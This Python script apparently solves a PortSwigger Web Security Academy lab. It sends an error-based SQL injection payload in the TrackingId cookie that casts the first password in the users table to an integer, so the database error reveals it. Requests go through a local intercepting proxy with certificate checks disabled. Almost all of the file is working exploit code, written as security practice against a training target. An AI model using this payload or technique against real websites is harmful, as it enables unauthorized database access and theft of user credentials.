import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Event
from urllib.parse import quote

import requests as r
import urllib3
from rich.console import Console
from rich.traceback import install

install()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

s: r.Session = r.Session()
console: Console = Console()

charset = string.ascii_letters + string.digits + "_$"
s.verify = False
print = console.print

s.proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}


def main() -> None:
    URL = "https://0ae30081044ca21c8193d08e00d40086.web-security-academy.net/filter?category=Pets"
    s.get(URL)

    res = r.get(
        URL,
        cookies={
            "TrackingId": f"' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--",
        },
        proxies=s.proxies,
        verify=False,
    )
    print(res.text)
    print(res.status_code)


if __name__ == "__main__":
    main()
